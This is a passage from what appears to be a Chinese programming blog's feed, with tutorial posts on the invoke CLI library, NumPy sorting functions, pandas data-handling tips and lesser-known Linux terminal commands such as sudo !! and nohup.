class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> invoke <span class="keyword">import</span> Collection, Program</span><br><span class="line"><span class="keyword">from</span> tester <span class="keyword">import</span> tasks</span><br><span class="line"></span><br><span class="line">program = Program(namespace=Collection.from_module(tasks), version=<span class="string">&#x27;0.1.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后在打包文件中声明入口函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setup.py</span></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&#x27;tester&#x27;</span>,</span><br><span class="line">    version=<span class="string">&#x27;0.1.0&#x27;</span>,</span><br><span class="line">    packages=[<span class="string">&#x27;tester&#x27;</span>],</span><br><span class="line">    install_requires=[<span class="string">&#x27;invoke&#x27;</span>],</span><br><span class="line">    entry_points=&#123;</span><br><span class="line">        <span class="string">&#x27;console_scripts&#x27;</span>: [<span class="string">&#x27;tester = tester.main:program.run&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如此打包发行的库，就是一个功能齐全的命令行工具了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ tester --version</span><br><span class="line">Tester <span class="number">0.1</span><span class="number">.0</span></span><br><span class="line">$ tester --<span class="built_in">help</span></span><br><span class="line">Usage: tester [--core-opts] &lt;subcommand&gt; [--subcommand-opts] ...</span><br><span class="line"></span><br><span class="line">Core options:</span><br><span class="line">  ... core options here, minus task-related ones ...</span><br><span class="line"></span><br><span class="line">Subcommands:</span><br><span class="line">  unit</span><br><span class="line">  integration</span><br><span class="line"></span><br><span class="line">$ tester --<span class="built_in">list</span></span><br><span class="line">No idea what <span class="string">&#x27;--list&#x27;</span> <span class="keyword">is</span>!</span><br><span class="line">$ tester unit</span><br><span class="line">Running unit tests!</span><br></pre></td></tr></table></figure><p>上手容易，开箱即用，invoke 不失为一款可以考虑的命令行工具库。更多详细用法，请查阅文档 。</p><h2 id="4、小结"><a href="#4、小结" class="headerlink" title="4、小结"></a>4、小结</h2><p>invoke 作为从 Fabric 项目中分离出来的独立项目，它自身具备一些完整而强大的功能，除了可用于开发命令行工具，它还是著名的任务自动化工具。</p><p>本文介绍了它的基础用法与 5 个方面的中级内容，相信读者们会对它产生一定的了解。invoke 的官方文档十分详尽，限于篇幅，本文不再详细展开，若感兴趣，请自行查阅文档哦。</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502094755" alt="音符"></p><p><strong>作者简介：</strong>豌豆花下猫，生于广东毕业于武大，现苏漂程序员，有一些极客思维，也有一些人文情怀，有一些温度，还有一些态度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一日一技：Numpy进阶之排序小技巧</title>
      <link href="/posts/14916.html"/>
      <url>/posts/14916.html</url>
      
        <content type="html"><![CDATA[<p>Numpy提供了大量用数组操作的函数，其中不乏常见的排序函数。</p><p>这里讲下<code>numpy.sort</code>、<code>numpy.argsort</code>、<code>numpy.lexsort</code>三种排序函数的用法。</p><h3 id="1、如何对数组元素进行快速排序？"><a href="#1、如何对数组元素进行快速排序？" class="headerlink" title="1、如何对数组元素进行快速排序？"></a>1、如何对数组元素进行快速排序？</h3><p>使用<code>numpy.sort</code>函数可以对数组进行排序，并返回排序好的数组。</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.sort(a, axis=-1, kind=None, order=None)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>a : 要排序的数组；</li><li>axis ：按什么轴进行排序，默认按最后一个轴进行排序；</li><li>kind ：排序方法，默认是快速排序；</li><li>order :  当数组定义了字段属性时，可以按照某个属性进行排序；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"># 创建一个一维数组</span><br><span class="line">x1 = np.array([1,8,2,4])</span><br><span class="line">x1</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">一维数组：</span><br><span class="line">array([1, 8, 2, 4])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 排序</span><br><span class="line">np.sort(x1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([1, 2, 4, 8])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import numpy as np</span><br><span class="line"># 创建一个二维数组</span><br><span class="line">x2 = np.array([[1,8,2,4],[4,5,1,3]])</span><br><span class="line">x2</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">二维数组：</span><br><span class="line">array([[1, 8, 2, 4],</span><br><span class="line">       [4, 5, 1, 3]])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 默认按最后一个轴排序，这里按行排序</span><br><span class="line">np.sort(x2)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([[1, 2, 4, 8],</span><br><span class="line">       [1, 3, 4, 5]])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 轴设为0，即按列排序</span><br><span class="line">np.sort(x2,axis=0)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([[1, 5, 1, 3],</span><br><span class="line">       [4, 8, 2, 4]])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>下面试下按照字段属性进行排序，需要用到<code>order</code>参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"># 这是一个名字、身高、年龄的数组</span><br><span class="line"># 先给各字段配置属性类型</span><br><span class="line">dtype = [(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, float), (&#x27;Age&#x27;, int)]</span><br><span class="line"># 各字段值</span><br><span class="line">values = [(&#x27;Li&#x27;, 1.8, 41), (&#x27;Wang&#x27;, 1.9, 38),(&#x27;Duan&#x27;, 1.7, 38)]</span><br><span class="line"># 创建数组</span><br><span class="line">a = np.array(values, dtype=dtype)</span><br><span class="line">a</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">数组：</span><br><span class="line">array([(b&#x27;Li&#x27;, 1.8, 41), (b&#x27;Wang&#x27;, 1.9, 38), (b&#x27;Duan&#x27;, 1.7, 38)],</span><br><span class="line">      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 按照属性Height进行排序,此时参数为字符串          </span><br><span class="line">np.sort(a, order=&#x27;Height&#x27;)     </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([(b&#x27;Duan&#x27;, 1.7, 38), (b&#x27;Li&#x27;, 1.8, 41), (b&#x27;Wang&#x27;, 1.9, 38)],</span><br><span class="line">      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 先按照属性Age排序,如果Age相等，再按照Height排序，此时参数为列表     </span><br><span class="line">np.sort(a, order=[&#x27;Age&#x27;, &#x27;Height&#x27;]) </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([(b&#x27;Duan&#x27;, 1.7, 38), (b&#x27;Wang&#x27;, 1.9, 38), (b&#x27;Li&#x27;, 1.8, 41)],</span><br><span class="line">      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="2、如何获取数组元素排序后的索引？"><a href="#2、如何获取数组元素排序后的索引？" class="headerlink" title="2、如何获取数组元素排序后的索引？"></a>2、如何获取数组元素排序后的索引？</h3><p><code>numpy.argsort</code>函数用于将数组排序后，返回数组元素从小到大依次排序的所有元素索引。</p><p>使用方法（和sort类似）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.argsort(a, axis=-1, kind=None, order=None)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>a : 要排序的数组；</li><li>axis ：按什么轴进行排序，默认按最后一个轴进行排序；</li><li>kind ：排序方法，默认是快速排序；</li><li>order :  当数组定义了字段属性时，可以按照某个属性进行排序；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"># 创建一维数组</span><br><span class="line">x = np.array([3, 1, 2])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">数组：</span><br><span class="line">array([3, 1, 2])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 获取排序后的索引</span><br><span class="line">np.argsort(x)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([1, 2, 0], dtype=int64)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import numpy as np</span><br><span class="line"># 创建二维数组</span><br><span class="line">x2 = np.array([[0, 3], [2, 2]])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">数组：</span><br><span class="line">array([[0, 3],</span><br><span class="line">       [2, 2]])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 默认按照最后一个轴进行排序，即行排序</span><br><span class="line"># 获取排序后的索引</span><br><span class="line">np.argsort(x2)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([[0, 1],</span><br><span class="line">       [0, 1]], dtype=int64)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>按字段属性进行排序，并获取索引。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 先给各字段配置属性类型</span><br><span class="line">dtype = [(&#x27;name&#x27;, str), (&#x27;age&#x27;, int)]</span><br><span class="line"># 值</span><br><span class="line">values = [(&#x27;Anna&#x27;, 28), (&#x27;Bob&#x27;, 27),(&#x27;Brown&#x27;,21)]</span><br><span class="line"># 创建数组</span><br><span class="line">x = np.array(values, dtype=dtype)</span><br><span class="line">x</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">数组：</span><br><span class="line">array([(&#x27;&#x27;, 28), (&#x27;&#x27;, 27), (&#x27;&#x27;, 21)],</span><br><span class="line">      dtype=[(&#x27;name&#x27;, &#x27;&lt;U&#x27;), (&#x27;age&#x27;, &#x27;&lt;i4&#x27;)])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 先按照属性name排序,如果name相等，再按照age排序</span><br><span class="line">np.argsort(x,order=[&#x27;name&#x27;,&#x27;age&#x27;])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([2, 1, 0], dtype=int64)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="3、如何按多条件进行排序？"><a href="#3、如何按多条件进行排序？" class="headerlink" title="3、如何按多条件进行排序？"></a>3、如何按多条件进行排序？</h3><blockquote><p>这里举一个应用场景：</p><p>小升初考试，重点班录取学生按照总成绩录取。</p><p>在总成绩相同时，数学成绩高的优先录取，在总成绩和数学成绩都相同时，按照英语成绩录取…… </p><p>这里，总成绩排在电子表格的最后一列，数学成绩在倒数第二列，英语成绩在倒数第三列。</p></blockquote><p><code>numpy.lexsort</code>函数用于按照多个条件（键）进行排序，返回排序后索引。</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.lexsort(keys, axis=-1)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>keys ：序列或元组，要排序的不同的列；</li><li>axis ：沿指定轴进行排序；</li></ul><p>说明： </p><p>使用键序列执行间接稳定排序。</p><p>给定多个排序键（可以将其解释为电子表格中的列），lexsort返回一个整数索引数组，该数组描述按多个列排序的顺序。</p><p>序列中的最后一个键用于主排序顺序，倒数第二个键用于辅助排序顺序，依此类推。</p><p>keys参数必须是可以转换为相同形状的数组的对象序列。</p><p>如果为keys参数提供了2D数组，则将其行解释为排序键，并根据最后一行，倒数第二行等进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"># 英语成绩</span><br><span class="line">eng = [90,85,95,80]</span><br><span class="line"># 数学成绩</span><br><span class="line">math = [80,95,90,85]</span><br><span class="line"># 总成绩</span><br><span class="line">total = [170,170,185,165]</span><br><span class="line"># 排序，获取索引</span><br><span class="line">np.lexsort((eng,math,total))</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">先按总成绩total进行排序，</span><br><span class="line">再按数学成绩math进行排序，</span><br><span class="line">最后按英语成绩进行排序。</span><br><span class="line">可以看到total里有两个170，</span><br><span class="line">这时候就按下一级math排序，</span><br><span class="line">最后获取排序后的索引</span><br><span class="line">输出：</span><br><span class="line">array([3, 0, 1, 2], dtype=int64)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 也可以直接传入数组</span><br><span class="line">score = np.array([[90,85,95,80],[80,95,90,85],[170,170,185,165]])</span><br><span class="line">np.lexsort(score)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">array([3, 0, 1, 2], dtype=int64)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>[1]Numpy文档: <em><a href="https://numpy.org/devdocs/index.html">https://numpy.org/devdocs/index.html</a></em></p><p>[2]Numpy教程: <em><a href="https://www.runoob.com/numpy/numpy-tutorial.html">https://www.runoob.com/numpy/numpy-tutorial.html</a></em></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据处理的3个小技巧，都很实用</title>
      <link href="/posts/24269.html"/>
      <url>/posts/24269.html</url>
      
        <content type="html"><![CDATA[<p>数据处理无所不在，掌握常用技巧，事半功倍。</p><p>此系列使用 Pandas 开展数据处理分析，总结其中常用、好用的数据分析技巧。</p><p>我使用的 Pandas 版本如下，顺便也导入 Pandas 库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pandas as pd</span><br><span class="line">&gt;&gt;&gt; pd.__version__</span><br><span class="line">&#x27;0.25.1&#x27;</span><br></pre></td></tr></table></figure><p>今天使用的数据集名称：IMDB-Movie-Data，取自 Kaggle，百度网盘下载链接如下：</p><blockquote><p>链接: <a href="https://pan.baidu.com/s/15u7Hf2y5dSFwek2vA1-zjg">https://pan.baidu.com/s/15u7Hf2y5dSFwek2vA1-zjg</a> 提取码: bvfx</p></blockquote><p>在开始前先确保解释器和数据集在同一目录下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.chdir(&#x27;D://source/dataset&#x27;) # 这是我的数据集所在目录</span><br><span class="line">&gt;&gt;&gt; os.listdir() # 确认此目录已经存在 IMDB-Movie-Data 数据集</span><br><span class="line">[&#x27;drinksbycountry.csv&#x27;, &#x27;IMDB-Movie-Data.csv&#x27;, &#x27;movietweetings&#x27;, &#x27;titanic_eda_data.csv&#x27;, &#x27;titanic_train_data.csv&#x27;]</span><br></pre></td></tr></table></figure><p>准备工作就位后，正式开始数据处理技巧之旅。</p><h4 id="1-Pandas-移除某列"><a href="#1-Pandas-移除某列" class="headerlink" title="1 Pandas 移除某列"></a>1 Pandas 移除某列</h4><p>导入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; df = pd.read_csv(&quot;IMDB-Movie-Data.csv&quot;)</span><br><span class="line">&gt;&gt;&gt; df.head(1) # 导入并显示第一行</span><br><span class="line">   Rank                    Title                    Genre  ...   Votes Revenue (Millions) Metascore</span><br><span class="line">0     1  Guardians of the Galaxy  Action,Adventure,Sci-Fi  ...  757074             333.13      76.0</span><br><span class="line"></span><br><span class="line">[1 rows x 12 columns]</span><br></pre></td></tr></table></figure><p>使用 pop 方法移除指定列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; meta = df.pop(&quot;Title&quot;).to_frame() # 移除 Title 列</span><br></pre></td></tr></table></figure><p>确认是否已被移除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; df.head(1) # df 变为 11列</span><br><span class="line">   Rank                    Genre  ... Revenue (Millions) Metascore</span><br><span class="line">0     1  Action,Adventure,Sci-Fi  ...             333.13      76.0</span><br><span class="line"></span><br><span class="line">[1 rows x 11 columns]</span><br></pre></td></tr></table></figure><h4 id="2-统计标题单词数"><a href="#2-统计标题单词数" class="headerlink" title="2 统计标题单词数"></a>2 统计标题单词数</h4><p>pop 后得到 meta，显示 meta 前 3 行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; meta.head(3)</span><br><span class="line">                     Title</span><br><span class="line">0  Guardians of the Galaxy</span><br><span class="line">1               Prometheus</span><br><span class="line">2                    Split</span><br></pre></td></tr></table></figure><p>标题是由单词组成，中间用空格分隔。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># .str.count(&quot; &quot;) + 1 得到单词个数 </span><br><span class="line">&gt;&gt;&gt; meta[&quot;words_count&quot;] = meta[&quot;Title&quot;].str.count(&quot; &quot;) + 1 </span><br><span class="line">&gt;&gt;&gt; meta.head(3) # words_count 列代表单词个数</span><br><span class="line">                     Title  words_count</span><br><span class="line">0  Guardians of the Galaxy            4</span><br><span class="line">1               Prometheus            1</span><br><span class="line">2                    Split            1</span><br></pre></td></tr></table></figure><h4 id="3-Genre-频次统计"><a href="#3-Genre-频次统计" class="headerlink" title="3 Genre 频次统计"></a>3 Genre 频次统计</h4><p>下面统计电影 Genre 的频次，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; vc = df[&quot;Genre&quot;].value_counts()</span><br></pre></td></tr></table></figure><p>下面显示电影 Genre 的 Top5 ，最高频为出现 50 次的 Action,Adventure,Sci-Fi 类，次之为 48 次的 Drama 类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; vc.head()</span><br><span class="line">Action,Adventure,Sci-Fi    50</span><br><span class="line">Drama                      48</span><br><span class="line">Comedy,Drama,Romance       35</span><br><span class="line">Comedy                     32</span><br><span class="line">Drama,Romance              31</span><br><span class="line">Name: Genre, dtype: int64</span><br></pre></td></tr></table></figure><p>展示 Top5 的饼状图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import matplotlib.pyplot as plt</span><br><span class="line">&gt;&gt;&gt; vc[:5].plot(kind=&#x27;pie&#x27;)</span><br><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot object at 0x000001D65B114948&gt;</span><br><span class="line">&gt;&gt;&gt; plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/05/02/2020/05/02/20200502094154" alt="img"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中实用但很小众的11个炫酷终端命令</title>
      <link href="/posts/44609.html"/>
      <url>/posts/44609.html</url>
      
        <content type="html"><![CDATA[<p>&emsp;今天给大家分享Linux总结出来的11个炫酷的Linux终端命令大全，通过今天这篇文章将向大家展示一系列的Linux命令、工具和技巧，我希望一开始就有人告诉我这些，而不是曾在我成长道路上绊住我。</p><h3 id="命令行日常系快捷键"><a href="#命令行日常系快捷键" class="headerlink" title="命令行日常系快捷键"></a>命令行日常系快捷键</h3><p>如下的快捷方式非常有用，能够极大的提升你的工作效率：</p><p>CTRL + U -剪切光标前的内容</p><p>CTRL + K -剪切光标至行末的内容</p><p>CTRL + Y -粘贴</p><p>CTRL + E -移动光标到行末</p><p>CTRL + A -移动光标到行首</p><p>ALT + F -跳向下一个空格</p><p>ALT + B -跳回上一个空格</p><p>ALT + Backspace -删除前一个单词</p><p>CTRL + W -剪切光标后一个单词</p><p>Shift + Insert -向终端内粘贴文本</p><p>那么为了让上述内容更易理解来看下面的这行命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get intall programname </span><br></pre></td></tr></table></figure><p>如你所见，命令中存在拼写错误，为了正常执行需要把“intall”替换成“install”。</p><p>想象现在光标正在行末，我们有很多的方法将她退回单词install并替换它。</p><p>我可以按两次ALT+B这样光标就会在如下的位置(这里用指代光标的位置)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get^intall programname </span><br></pre></td></tr></table></figure><p>现在你可以按两下方向键并将“s”插入到install中去了。</p><p>如果你想将浏览器中的文本复制到终端，可以使用快捷键”shift + insert”。</p><h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO !!"></a>SUDO !!</h3><p>如果你还不知道这个命令，我觉得你应该好好感谢我，因为如果你不知道的话，那每次你在输入长串命令后看到“permission denied”后一定会痛苦不堪。</p><p>sudo !!</p><p>如何使用sudo !!?很简单。试想你刚输入了如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ranger </span><br></pre></td></tr></table></figure><p>一定会出现“Permission denied”，除非你已经登录了足够高权限的账户。</p><p>sudo !!就会用sudo的形式运行上一条命令。所以上一条命令就变成了这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ranger </span><br></pre></td></tr></table></figure><p>如果你不知道什么是sudo，戳这里。</p><h3 id="暂停并在后台运行命令"><a href="#暂停并在后台运行命令" class="headerlink" title="暂停并在后台运行命令"></a>暂停并在后台运行命令</h3><p>我曾经写过一篇如何在终端后台运行命令的指南。</p><p>CTRL + Z -暂停应用程序</p><p>fg -重新将程序唤到前台</p><p>如何使用这个技巧呢?</p><p>试想你正用nano编辑一个文件：</p><p>sudo nano abc.txt文件编辑到一半你意识到你需要马上在终端输入些命令，但是nano在前台运行让你不能输入。</p><p>你可能觉得唯一的方法就是保存文件，退出nano，运行命令以后在重新打开nano。</p><p>其实你只要按CTRL + Z，前台的命令就会暂停，画面就切回到命令行了。然后你就能运行你想要运行命令，等命令运行完后在终端窗口输入“fg”就可以回到先前暂停的任务。</p><p>有一个尝试非常有趣就是用nano打开文件，输入一些东西然后暂停会话。再用nano打开另一个文件，输入一些什么后再暂停会话。如果你输入“fg”你将回到第二个用nano打开的文件。只有退出nano再输入“fg”，你才会回到***个用nano打开的文件。</p><h3 id="使用nohup在登出SSH会话后仍运行命令"><a href="#使用nohup在登出SSH会话后仍运行命令" class="headerlink" title="使用nohup在登出SSH会话后仍运行命令"></a>使用nohup在登出SSH会话后仍运行命令</h3><p>如果你用ssh登录别的机器时，nohup命令真的非常有用。</p><p>那么怎么使用nohup呢?</p><p>想象一下你使用ssh远程登录到另一台电脑上，你运行了一条非常耗时的命令然后退出了ssh会话，不过命令仍在执行。而nohup可以将这一场景变成现实。</p><p>举个例子，因为测试的需要，我用我的树莓派来下载发行版。我绝对不会给我的树莓派外接显示器、键盘或鼠标。</p><p>一般我总是用SSH从笔记本电脑连接到树莓派。如果我在不用nohup的情况下使用树莓派下载大型文件，那我就必须等待到下载完成后，才能登出ssh会话关掉笔记本。可如果是这样，那我为什么要使用树莓派下文件呢?</p><p>使用nohup的方法也很简单，只需如下例中在nohup后输入要执行的命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup wget http://mirror.is.co.za/mirrors/linuxmint.com/iso//stable/17.1/linuxmint-17.1-cinnamon-64bit.iso &amp; </span><br></pre></td></tr></table></figure><h3 id="‘在’特定的时间运行Linux命令"><a 